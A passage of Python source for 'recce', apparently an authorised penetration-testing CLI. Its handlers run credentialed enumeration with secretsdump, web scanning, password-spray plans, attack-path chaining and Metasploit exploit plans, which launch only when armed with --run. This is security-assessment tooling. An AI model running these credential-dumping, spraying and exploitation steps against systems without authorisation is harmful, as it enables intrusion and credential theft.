    issues, auth = credenum.enrich_host(host, creds, ssh_creds, aggressive=aggressive,
                                        admin_creds=admin_creds)
    return host, issues, auth


def _auth_cell(st: dict | None) -> str:
    """Format one account's per-host auth outcome for the summary table. A cell
    is only recorded when the tool actually ran, so an unrecorded/absent cell
    shows '-' (never FAIL) - a missing tool is not an auth failure."""
    if not st or not st.get("tried"):
        return "-"
    if st.get("error"):
        return "ERR"          # tool ran but errored (unreachable/timeout)
    if not st.get("auth"):
        return "FAIL"         # credentials rejected
    return "OK (admin)" if st.get("admin") else "OK"


def _print_auth_table(auth_rows: list) -> None:
    """Per-host authentication success/fail table. Only shows the columns that
    were actually attempted; flags rejected credentials loudly at the end."""
    if not auth_rows:
        return
    cols = [("user", "USER ACCT"), ("admin", "PRIV ACCT"), ("ssh", "SSH")]
    used = [(k, hd) for k, hd in cols if any(a.get(k) for _, a in auth_rows)]
    if not used:
        return
    print("\n[*] Authentication summary (per host):")
    header = f"      {'HOST':<16}" + "".join(f"{hd:<13}" for _, hd in used)
    print(header)
    print("      " + "-" * (len(header) - 6))
    fails = errs = 0
    for ip, a in sorted(auth_rows, key=lambda r: _ip_key(r[0])):
        cells = ""
        for k, _ in used:
            val = _auth_cell(a.get(k))
            fails += val == "FAIL"
            errs += val == "ERR"
            cells += f"{val:<13}"
        print(f"      {ip:<16}{cells}")
    if fails:
        print(f"[!] {fails} credential(s) were REJECTED (FAIL) - check the "
              "username/password/domain for those rows.")
    if errs:
        print(f"[!] {errs} attempt(s) ERRORED (ERR) - host unreachable, timed "
              "out, or the tool failed; not necessarily a credential problem.")


def _phase_credenum(store, paths, args) -> None:
    from . import credenum
    creds = _creds_of(args)
    admin_creds = _admin_creds_of(args)
    ssh_creds = _ssh_creds_of(args)
    aggressive = getattr(args, "aggressive", False)
    if not creds and not ssh_creds and not admin_creds:
        print("\n" + "!" * 64)
        print("[x] credenum needs credentials but none were given.")
        print("    Provide --username/--password (+--domain) for SMB/AD, and/or "
              "--ssh-user for Linux hosts.")
        print("!" * 64)
        return
    tools = credenum.available_tools()
    have = [k for k, v in tools.items() if v]
    print(f"[*] Credentialed enum tools present: {', '.join(have) or 'NONE'}.")
    if not have:
        print("\n" + "!" * 64)
        print("[x] No credentialed-enum tools found (netexec/impacket/ssh).")
        print("    Install netexec + impacket, or ensure ssh is on PATH, then re-run.")
        print("!" * 64)
        return
    targets = _selected_hosts(store.all_hosts(), args)
    if not targets:
        print("[!] No hosts in scope.")
        return
    accts = []
    if creds:
        accts.append(f"user '{creds['username']}'")
    if admin_creds:
        accts.append(f"privileged '{admin_creds['username']}' (admin checks + secretsdump)")
    mode = (" with " + " + ".join(accts)) if accts else ""
    if aggressive and not admin_creds:
        mode += " + secretsdump (aggressive)"
    total = len(targets)
    print(f"[*] Credentialed enum on {total} host(s){mode} ...")
    refresher = _Refresher(args)
    completed = 0
    start = time.monotonic()
    errs: list[tuple[str, str]] = []
    auth_rows: list[tuple[str, dict]] = []   # (ip, auth) for the success/fail table
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
        futures = {ex.submit(_credenum_worker, h, creds, ssh_creds, aggressive,
                             admin_creds): h.ip
                   for h in targets}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues, auth = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "credenum", "level": "error",
                                 "message": f"credenum crashed: {e}"}])
                completed += 1
                errs.append((ip, f"crashed: {e}"))
                print(f"    [{completed}/{total}] {ip}: FAILED (crashed)"
                      f"{_progress(completed, total, start)}")
                continue
            _record_issues(store, paths, ip, issues)
            errs.extend((ip, i["message"]) for i in issues
                        if i.get("level") == "error")
            if auth:
                auth_rows.append((ip, auth))
            if not _persist_host(store, paths, ip, "credenum", host):
                completed += 1
                continue
            completed += 1
            n_acct = sum(1 for a in host.accounts
                         if a.source in ("netexec", "impacket", "secretsdump"))
            print(f"    [{completed}/{total}] {ip}: cred-enum done"
                  + (f" ({n_acct} account/loot rows)" if n_acct else "")
                  + _progress(completed, total, start))
            refresher.tick(store, paths, args.title)
    _print_auth_table(auth_rows)
    _summarize_failures("credenum", errs, total)


def _setup_scan(args, need_targets=True):
    """Shared setup: profile, env check, store. Returns (profile, paths, store)."""
    profile = scanner.PROFILES[args.profile]
    _apply_profile_overrides(profile, args)
    try:
        for w in scanner.check_environment(profile):
            print(f"[!] {w}")
    except scanner.ScannerError as e:
        print(f"[x] {e}")
        return None, None, None
    try:
        paths = _open_paths(args.output_dir)
    except OSError as e:
        print(f"[x] Cannot use output dir '{args.output_dir}': {e}")
        return None, None, None
    try:
        store = Store(paths["db"])
    except StoreError as e:
        print(f"[x] {e}")
        return None, None, None
    _import_excel_tracking(store, paths)
    return profile, paths, store


def cmd_enum(args: argparse.Namespace) -> int:
    print(BANNER)
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    store.set_meta("engagement", args.title)
    subnet_map, live_ips, port_map = _discover(args, profile, store, paths)
    if subnet_map is None:   # _discover already printed the specific reason
        store.close()
        return 1
    try:
        _phase_enum(store, paths, args, profile, subnet_map, live_ips, port_map)
        if args.ldap_enum or args.ldap_anon:
            _run_ldap_enum(store, args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, args.title)
        store.close()
    print(f"\n[+] Enumeration done -> {paths['xlsx']}")
    print(f"    Next:  recce vulns -o {args.output_dir}     "
          "# vuln-scan the open ports it found")
    print(f"    or:    recce services -o {args.output_dir}  "
          "# the exact per-service enum command for each open port")
    return 0


def cmd_vulns(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
        _phase_vulns(store, paths, args, profile)
        if args.ldap_enum or args.ldap_anon:
            _run_ldap_enum(store, args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Vuln scan done -> open the Vulnerabilities / Exploitation tabs.")
    print(f"    Next:  recce status -o {args.output_dir}      # what's left, and the "
          "suggested next step")
    return 0


def cmd_scan(args: argparse.Namespace) -> int:
    """Convenience: run enum then vulns in one shot."""
    print(BANNER)
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    store.set_meta("engagement", args.title)
    subnet_map, live_ips, port_map = _discover(args, profile, store, paths)
    if subnet_map is None:   # _discover already printed the specific reason
        store.close()
        return 1
    try:
        _phase_enum(store, paths, args, profile, subnet_map, live_ips, port_map)
        _phase_vulns(store, paths, args, profile)
        if args.ldap_enum or args.ldap_anon:
            _run_ldap_enum(store, args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, args.title)
        store.close()
    print("\n[+] Done.")
    return 0


def cmd_db(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
        _phase_db(store, paths, args, profile)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Database scan done.")
    return 0


def cmd_privesc(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
        if args.scan:
            _phase_privesc(store, paths, args, profile)
        else:
            print("[*] Generating priv-esc playbook from existing data "
                  "(use --scan to also run remote privesc NSE checks).")
        # Mark the priv-esc step complete for the hosts we addressed.
        for h in _selected_hosts(store.all_hosts(), args):
            if not h.privesc_checked:
                h.privesc_checked = True
                store.upsert_host(h)
            store.delete_tracking(tr.step_key("privesc", h.ip))  # re-run clears override
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Priv-esc sheet updated.")
    return 0


def cmd_credenum(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    _, paths, store = _setup_scan(args, need_targets=False)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
        _phase_credenum(store, paths, args)
        # Note: the manual 'Creds' checklist box is the operator's own sign-off,
        # so credenum records findings but never ticks it automatically.
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Credentialed enum complete - see Users & Accounts / Vulnerabilities.")
    return 0


def cmd_writeups(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)   # honour any Excel edits first
    hosts = _selected_hosts(store.all_hosts(), args)
    out_dir = os.path.join(args.output_dir, "writeups")
    from .report_docx import build_writeups
    from . import screenshot

    shots: dict = {}
    if not args.no_screenshots and not screenshot.available():
        print("[!] No headless browser found; skipping auto-screenshots (add them "
              "by hand in Word). Install firefox or chromium to enable them.")
    elif not args.no_screenshots:
        web_hosts = [h for h in hosts
                     if any(screenshot._web_url(p) for p in h.open_ports)]
        if web_hosts:
            print(f"[*] Capturing web screenshots for {len(web_hosts)} host(s) "
                  f"(headless browser) ...")
            for h in web_hosts:
                grabbed = screenshot.capture_for_host(h)
                if grabbed:
                    shots[h.ip] = grabbed
                    print(f"    [+] {h.ip}: {len(grabbed)} screenshot(s)")
    summary = build_writeups(hosts, out_dir, min_severity=args.min_severity,
                             include_potential=args.include_potential,
                             screenshots=shots, overwrite=args.overwrite)
    title = store.get_meta("engagement") or args.title
    combined_path = None
    if not args.no_combined:
        from .report_docx import build_combined
        combined_path = os.path.join(out_dir, "findings_report.docx")
        build_combined(hosts, combined_path, title=f"{title} - Findings Report",
                       min_severity=args.min_severity,
                       include_potential=args.include_potential, screenshots=shots)
    store.close()
    scope = "all" if args.include_potential else "real"
    print(f"\n[+] Finding write-ups: {len(summary['written'])} generated, "
          f"{len(summary['skipped'])} kept (already edited), "
          f"{summary['total']} {scope} finding(s) total.")
    print(f"    -> {out_dir}/  (open each .docx in Word to finish it)")
    if combined_path:
        print(f"[+] Combined report (summary table + all findings): {combined_path}")
    if summary.get("dropped_potential"):
        print(f"    ({summary['dropped_potential']} low-confidence 'potential' "
              f"finding(s) skipped; add --include-potential to write them up too)")
    if summary["skipped"]:
        print("    (use --overwrite to regenerate the kept ones - loses edits)")
    return 0


def cmd_writeup(args: argparse.Namespace) -> int:
    """Write up a SINGLE finding, pre-filled with looted/obtained evidence. With
    no selector, list the findings so the tester can pick one."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = store.all_hosts()
    from .report_docx import list_findings, build_one_writeup

    if not args.selector:
        findings = list_findings(hosts, min_severity="info")
        if not findings:
            print("[!] No findings yet. Run `vulns` (or `import`/`ingest`) first.")
            store.close()
            return 0
        print(f"Findings ({len(findings)}) - pick one:  recce writeup <id|CVE|IP|word> "
              f"-o {args.output_dir}\n")
        for row in findings:
            tag = "" if row["real"] else "  (potential)"
            aff = ", ".join(row["affected"][:4]) + ("..." if len(row["affected"]) > 4 else "")
            cve = f"  {row['cves'][0]}" if row["cves"] else ""
            print(f"  {row['id']}  {row['severity'].upper():<8} {row['title']}{cve}")
            print(f"          affected: {aff}{tag}")
        store.close()
        return 0

    out_dir = os.path.join(args.output_dir, "writeups")
    shots: dict = {}
    if not args.no_screenshots:
        from . import screenshot
        if screenshot.available():
            res = _match_one_host(hosts, args.selector)
            for h in res:
                grabbed = screenshot.capture_for_host(h)
                if grabbed:
                    shots[h.ip] = grabbed
    result = build_one_writeup(hosts, out_dir, args.selector,
                               screenshots=shots, overwrite=args.overwrite)
    store.close()
    if result["written"]:
        m = result["matched"][0]
        print(f"[+] Wrote {m['id']} ({m['severity'].upper()}): {m['title']}")
        print(f"    -> {result['written']}")
        if result.get("looted"):
            print(f"    pre-filled with {result['looted']} looted/obtained item(s) "
                  f"for the affected host(s).")
        if not result.get("real", True):
            print("    note: this is a low-confidence 'potential' (version-inferred) finding.")
        print("    Open it in Word to finish the narrative, impact, and screenshots.")
        return 0
    # No single match: help the tester narrow it.
    if result["reason"] == "exists":
        print(f"[!] Write-up already exists: {result['path']}")
        print("    Use --overwrite to regenerate it (loses any edits).")
        return 0
    cand = result["matched"]
    if not cand:
        print(f"[x] No finding matches '{args.selector}'. "
              f"Run `recce writeup -o {args.output_dir}` to list them.")
        return 1
    print(f"[!] '{args.selector}' matches {len(cand)} findings - be more specific:")
    for m in cand:
        print(f"    {m['id']}  {m['severity'].upper():<8} {m['title']}  "
              f"[{', '.join(m['affected'][:3])}]")
    return 1


def _match_one_host(hosts, selector):
    """Best-effort: the host(s) an IP/IP:port selector points at (for screenshots)."""
    sel = (selector or "").split(":")[0].strip()
    return [h for h in hosts if h.ip == sel] if sel else []


def cmd_web(args: argparse.Namespace) -> int:
    """Deep-enumerate every web-facing endpoint: fingerprint the stack and run the
    non-intrusive checks (exposed .git/.env, server-status/actuator, directory
    listing, dangerous methods, cookie flags, headers/TLS). Findings fold into the
    workbook; each endpoint gets the exact Kali deep-scan commands."""
    from . import web
    print(BANNER)
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    active = not getattr(args, "no_active", False)
    # Optional authenticated scan: --cookie and/or repeated --header "K: V".
    auth: dict = {}
    if getattr(args, "cookie", None):
        auth["Cookie"] = args.cookie
    for hv in getattr(args, "header", None) or []:
        if ":" in hv:
            k, v = hv.split(":", 1)
            auth[k.strip()] = v.strip()
    auth = auth or None
    targets = [h for h in hosts if any(web.is_web(p) for p in h.open_ports)]
    if not targets:
        print("[!] No HTTP/HTTPS endpoints found. Run `enum` (services) first.")
        store.close()
        return 0
    workers = max(1, getattr(args, "workers", 6))
    n_ep = sum(1 for h in targets for p in h.open_ports if web.is_web(p))
    print(f"[*] Web-scanning {n_ep} endpoint(s) on {len(targets)} host(s) "
          f"with {workers} worker(s){'' if active else ' (passive)'}"
          f"{' (authenticated)' if auth else ''} ...")
    total_findings = 0
    creds = getattr(args, "creds", False)
    do_crawl = getattr(args, "crawl", False)

    def _scan(h):
        profiles = web.scan_host(h, active, auth, creds)
        if do_crawl:
            pages, added = web.scan_crawl(h, auth)
            print(f"    [{h.ip}] crawled {pages} page(s), +{added} finding(s)")
        return profiles

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_scan, h): h for h in targets}
        for fut in as_completed(futures):
            h = futures[fut]
            try:
                profiles = fut.result()
            except Exception as e:  # noqa: BLE001 - one host never aborts the sweep
                _record_issues(store, paths, h.ip, [{"phase": "web", "level": "warning",
                               "message": f"web scan failed: {e}"}])
                continue
            _persist_host(store, paths, h.ip, "web", h)
            for pr in profiles:
                tech = f"  [{', '.join(pr['tech'])}]" if pr["tech"] else ""
                wv = sum(1 for v in h.vulns if v.port == pr["port"] and v.source == "web")
                total_findings += wv
                print(f"    {pr['url']:<28} {pr.get('server', '') or '?':<20}"
                      f"{tech}  ({wv} finding(s))")
    _final_report(store, paths, store.get_meta("engagement") or args.title)
    store.close()
    if getattr(args, "screenshots", False):
        _web_screenshots(targets, args.output_dir)
    print(f"\n[+] {total_findings} web finding(s) folded in. See the Web tab (endpoints "
          f"+ Kali deep-scan commands) and Vulnerabilities/Verification in "
          f"{paths['xlsx']}.")
    print("    Prove them: recce prove -o " + args.output_dir)
    return 0


def _web_screenshots(targets, output_dir) -> None:
    """Headless-browser screenshot per web endpoint -> engagement/screenshots/."""
    from . import screenshot, web
    if not screenshot.available():
        print("    [!] --screenshots: no headless browser found (chromium/firefox); "
              "skipping. `recce doctor` shows what's missing.")
        return
    shot_dir = os.path.join(output_dir, "screenshots")
    try:
        os.makedirs(shot_dir, exist_ok=True)
    except OSError:
        return
    n = 0
    for h in targets:
        for p in h.open_ports:
            if not web.is_web(p):
                continue
            png = screenshot.capture(web.url_for(h.ip, p))
            if png:
                fn = os.path.join(shot_dir, f"web_{h.ip}_{p.portid}.png")
                try:
                    with open(fn, "wb") as fh:
                        fh.write(png)
                    n += 1
                except OSError:
                    pass
    print(f"    {n} screenshot(s) -> {shot_dir}/")


def cmd_services(args: argparse.Namespace) -> int:
    """Print the exact per-service enumeration command to run for every open port
    recce found - the bridge from the datastore to recce/scripts/. Answers 'what
    do I type next?' for each service."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    hosts = _selected_hosts(store.all_hosts(), args)
    store.close()
    from . import serviceenum

    print("Per-service enumeration - run these against the open ports recce found.")
    print("Safe by default (banners, versions, anon/null checks, TLS, NSE 'safe');")
    print("add -a to a command for the intrusive checks (brute / nikto / dir-bust).\n")
    total = 0
    unmapped: list[tuple[str, int, str]] = []
    for h in hosts:
        cmds = serviceenum.commands_for_host(h)
        um = serviceenum.unmapped_ports(h)
        if not cmds and not um:
            continue
        label = h.ip + (f"  ({h.hostname})" if h.hostname else "")
        roles = f"   [{', '.join(h.roles)}]" if h.roles else ""
        print(f"{label}{roles}")
        for port, svc, _script, cmd in cmds:
            print(f"  {port:<6}{svc:<14}{cmd}" + ("  -a" if args.aggressive else ""))
            total += 1
        for port, svc in um:
            unmapped.append((h.ip, port, svc))
        print()
    if total == 0:
        print("No enumerable open ports yet. Run `enum` (or `import`) first.")
        return 0
    print(f"{total} service command(s) across {len({h.ip for h in hosts})} host(s).")
    raw_glob = os.path.join(args.output_dir, "raw", "*.xml")
    print("Or sweep every open port in one go from recce's own scans:")
    print(f"  {serviceenum.DRIVER} from-nmap {raw_glob}"
          + ("  -a" if args.aggressive else ""))
    if unmapped:
        print(f"\n{len(unmapped)} open port(s) have no dedicated script - "
              f"enumerate manually:")
        for ip, port, svc in unmapped[:15]:
            print(f"  {ip}:{port} ({svc or '?'})  ->  nmap -sV --script vuln -p {port} {ip}")
        if len(unmapped) > 15:
            print(f"  ... and {len(unmapped) - 15} more")
    return 0


def cmd_exploitplan(args: argparse.Namespace) -> int:
    """Generate a per-finding exploitation PLAN: ready-to-run artifacts that drive
    EXISTING published tools/modules with the discovered parameters filled in.
    Confirmed findings only; safe by default (msf launch lines commented)."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    store.close()
    from . import exploitplan

    summary = exploitplan.build_plan(hosts, args.output_dir, lhost=args.lhost,
                                     lport=args.lport, run=args.run)
    if not summary["plans"]:
        print("[!] No confirmed findings map to a published exploit/tool yet.")
        print("    Plans cover CONFIRMED findings only (not 'potential' version "
              "guesses). Run `vulns` for deeper detection, or `ingest` on-target loot.")
        return 0
    print(f"[+] Exploitation plan -> {summary['dir']}/")
    print(f"    {summary['host_scripts']} per-host plan script(s), "
          f"{summary['rc_files']} Metasploit resource (.rc) file(s), "
          f"{summary.get('poc_files', 0)} PoC source file(s), "
          f"{summary['actions']} action(s) across {len(summary['plans'])} host(s).")
    print("    Each artifact configures an EXISTING published tool/module with the")
    print("    target's own parameters. PoC sources build a proof (marker file /")
    print("    throwaway account) - swap the ACTION for your ROE command.")
    if args.lhost == "<LHOST>":
        print("    ! Set your callback with --lhost <IP> (payloads currently show "
              "<LHOST>).")
    if args.run:
        print("    ! --run: Metasploit launch lines are ARMED. Rules of engagement only.")
    else:
        print("    Safe mode: .rc files run `check` only; edit them (or use --run) "
              "to launch.")
    print(f"    Review:  cat {summary['dir']}/README.txt")
    return 0


def _prove_run_safe_checks(store, paths, hosts, args) -> None:
    """--run: re-run the NON-INTRUSIVE detection NSE for SMB findings so a verdict
    can move from LIKELY to CONFIRMED / FALSE POSITIVE on real evidence. These are
    detection scripts (smb-security-mode, smb-vuln-ms17-010), not exploits."""
    from . import proofs
    profile = scanner.PROFILES.get(getattr(args, "profile", "standard"),
                                   scanner.PROFILES["standard"])
    smb_scripts = ["smb-security-mode", "smb2-security-mode",
                   "smb-vuln-ms17-010", "smb-enum-shares"]
    smb_recipes = {"smb-signing-relay", "ms17-010", "smb-null-session"}
    for h in hosts:
        rids = {proofs.recipe_for(v)["id"] for v in h.vulns if proofs.recipe_for(v)}
        if not (rids & smb_recipes) or not any(p.portid in (139, 445) for p in h.open_ports):
            continue
        print(f"[*] {h.ip}: re-running safe SMB detection NSE to prove/disprove ...")
        out = os.path.join(paths["raw"], f"{h.ip}_prove.xml")
        try:
            _, iss = scanner.nse_scan(h.ip, [445], out, profile, smb_scripts)
            if iss:
                _record_issues(store, paths, h.ip, [_mkissue(iss, "prove")])
            _merge_vuln_results(h, np.parse_nmap_xml(out))
            ad.parse_signing_and_ntlm(h)          # refresh smb_signing from the NSE
            _persist_host(store, paths, h.ip, "prove", h)
        except Exception as e:  # noqa: BLE001 - one host's re-scan never aborts prove
            print(f"    [!] {h.ip}: prove re-scan failed: {e}")


def cmd_prove(args: argparse.Namespace) -> int:
    """Prove out flagged findings: for the noisy types (ActiveMQ / SMB / MS17-010 /
    SeImpersonate / …) render a verdict - CONFIRMED, LIKELY, FALSE POSITIVE or
    INCONCLUSIVE - from the evidence recce already holds, plus the exact safe step
    to finish proving. Nothing here exploits anything."""
    from . import proofs
    print(BANNER)
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    if getattr(args, "run", False):
        _prove_run_safe_checks(store, paths, hosts, args)
        hosts = _selected_hosts(store.all_hosts(), args)      # reload merged results
    results = proofs.verify_hosts(hosts)
    if not results:
        print("[!] No proof-able findings matched (ActiveMQ / SMB signing / MS17-010 / "
              "SeImpersonate / null-session / anon-FTP / weak-TLS).")
        store.close()
        return 0
    icon = {proofs.CONFIRMED: "[+]", proofs.LIKELY: "[~]",
            proofs.INCONCLUSIVE: "[?]", proofs.FALSE_POSITIVE: "[x]"}
    for r in results:
        print(f"\n  {icon.get(r['verdict'], '[?]')} {r['verdict']}  "
              f"{r['ip']}:{r['port'] or '-'}  {r['vuln']}")
        for e in r["evidence"]:
            print(f"        - {e}")
        if r["verdict"] in (proofs.CONFIRMED, proofs.LIKELY):
            print(f"        finish: {r['finish']}")
    c = proofs.summary(results)
    print(f"\n[+] {c[proofs.CONFIRMED]} confirmed · {c[proofs.LIKELY]} likely · "
          f"{c[proofs.INCONCLUSIVE]} inconclusive · {c[proofs.FALSE_POSITIVE]} false positive.")
    _final_report(store, paths, store.get_meta("engagement") or args.title)
    store.close()
    print(f"    Full detail on the Verification tab in {paths['xlsx']}.")
    return 0


def cmd_attackpath(args: argparse.Namespace) -> int:
    """Chain the confirmed findings into a prioritised attack path (foothold ->
    priv-esc -> creds -> lateral -> domain), grounded in what recce found."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    store.close()
    from . import attackpath as ap

    steps = ap.build(hosts)
    for line in ap.narrative(hosts, steps):
        print(line)
    if not steps:
        return 0
    print()
    cur = None
    for s in steps:
        if s["stage"] != cur:
            cur = s["stage"]
            print(f"== {cur} ==")
        tgt = s["ip"] + (f" ({s['hostname']})" if s["hostname"] else "")
        print(f"  [{tgt}] {s['title']}")
        print(f"       {s['tool']}:  {s['cmd']}")
    # Graph artifacts - Mermaid (paste anywhere) + Graphviz DOT (render to PNG).
    mmd_path = os.path.join(args.output_dir, "attack_path.mmd")
    dot_path = os.path.join(args.output_dir, "attack_path.dot")
    try:
        os.makedirs(args.output_dir, exist_ok=True)
        with open(mmd_path, "w", encoding="utf-8") as fh:
            fh.write(ap.mermaid(hosts, steps))
        with open(dot_path, "w", encoding="utf-8") as fh:
            fh.write(ap.dot(hosts, steps))
        print(f"\n  Graph: {mmd_path}  (paste into mermaid.live / GitHub)")
        print(f"  Graph: {dot_path}  (render: dot -Tpng {dot_path} -o attack_path.png)")
    except OSError as exc:
        print(f"  [!] Could not write graph files: {exc}")
    print("\n  Full table on the Attack Path sheet; runnable artifacts via "
          "`recce exploitplan`.")
    return 0


def _parse_cred_spec(spec: str):
    """Parse 'user:secret', 'DOMAIN\\user:secret', or 'domain/user:secret'."""
    from .models import Credential
    idpart, secret = (spec.split(":", 1) + [""])[:2] if ":" in spec else (spec, "")
    domain = ""
    if "\\" in idpart:
        domain, user = idpart.split("\\", 1)
    elif "/" in idpart:
        domain, user = idpart.split("/", 1)
    else:
        user = idpart
    kind = "nthash" if re.fullmatch(r"[0-9a-fA-F]{32}", secret or "") else \
        ("password" if secret else "blank")
    return Credential(username=user, secret=secret, kind=kind, domain=domain,
                      source="manual")


def cmd_creds(args: argparse.Namespace) -> int:
    """Stack credentials (auto-harvested + manually captured) and build a spray
    plan across the discovered SMB/WinRM/LDAP/MSSQL/RDP/SSH surface."""
    from . import credentials as cr
    from .models import Credential
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1

    # ADD captured credentials.
    added = False
    to_add = []
    for spec in (args.add or []):
        to_add.append(_parse_cred_spec(spec))
    if args.user:
        kind = "nthash" if args.hash else ("password" if getattr(args, "password", None) else "blank")
        to_add.append(Credential(username=args.user, secret=(args.hash or args.password or ""),
                                 kind=kind, domain=args.domain or "", source="manual"))
    if to_add:
        n = sum(1 for c in to_add if store.add_credential(c))
        print(f"[+] Added {n} credential(s)"
              + (f" ({len(to_add) - n} already stacked)" if n < len(to_add) else "") + ".")
        added = True

    hosts = _selected_hosts(store.all_hosts(), args)
    stored = store.all_credentials()
    stacked = cr.stack(hosts, stored)

    # PLAN: write files + print the spray commands.
    if args.plan:
        if not stacked:
            print("[!] No credentials to spray yet. Add one:  "
                  "recce creds --add 'CORP\\alice:Passw0rd!'")
            store.close()
            return 0
        summary = cr.build_spray(stacked, hosts, args.output_dir)
        print(f"[+] Spray plan for {len(stacked)} credential(s) -> files in "
              f"{summary['dir']}/")
        if summary["files"]:
            print("    " + ", ".join(sorted(summary["files"])))
        print()
        for line in summary["commands"] or ["  (no sprayable services in scope yet)"]:
            print("  " + line if not line.startswith("#") else "\n  " + line)
        print("\n  ! Check the account-lockout policy first. '--continue-on-success' "
              "keeps going after a hit;")
        print("    the paired (user<->pass) list avoids a cartesian brute. Rules of "
              "engagement only.")
        store.close()
        return 0

    # ADD then regenerate the workbook so the Credentials sheet reflects it.
    if added:
        title = store.get_meta("engagement") or getattr(args, "title", "") or "Recce Engagement"
        _generate_reports(store, paths, title, quiet=True)

    # LIST (default).
    if not stacked:
        print("No credentials stacked yet.")
        print("  Capture then add:  recce creds --add 'CORP\\alice:Passw0rd!'  "
              "(or --user alice --hash <nt> --domain CORP)")
        print("  Then:              recce creds --plan   # netexec/impacket spray plan")
        store.close()
        return 0
    print(f"Stacked credentials ({len(stacked)}):")
    for c in stacked:
        sec = c.secret or "(blank)"
        if c.kind == "nthash" and len(sec) > 16:
            sec = sec[:13] + "..."
        origin = f" @{c.origin_ip}" if c.origin_ip else ""
        print(f"  {c.label:<26} {c.kind:<8} {sec:<20} [{c.source}{origin}]")
    print("\n  recce creds --plan   # build the spray plan (writes users/passwords/"
          "hashes + commands)")
    store.close()
    return 0


def cmd_doctor(args: argparse.Namespace) -> int:
    """Check that this box can run the tool, and optionally prove it with a
    real localhost self-scan. Run this on any system before an engagement."""
    import platform
    import shutil

    print(BANNER)
    print("Environment")
    print(f"  Python           {sys.version.split()[0]}  ({platform.python_implementation()})")
    print(f"  Platform         {platform.system()} {platform.release()}")
    is_root = hasattr(os, "geteuid") and os.geteuid() == 0
    print(f"  Root / privileges {'yes' if is_root else 'NO'}"
          + ("" if is_root else "  -> falls back to TCP connect scan; no SYN/OS/UDP"))
    py_ok = sys.version_info >= (3, 9)
    if not py_ok:
        print("  ! Python 3.9+ recommended.")

    print("\nTools (which capabilities are available)")
    tools = [
        ("nmap", True, "core scanning / service+OS detection / NSE vuln+AD+DB"),
        ("masscan", False, "--fast network-wide sweep"),
        ("searchsploit", False, "offline exploit mapping (Exploits sheet)"),
        ("ldap", False, "credentialed AD LDAP enum (ldapsearch or the ldap3 package)"),
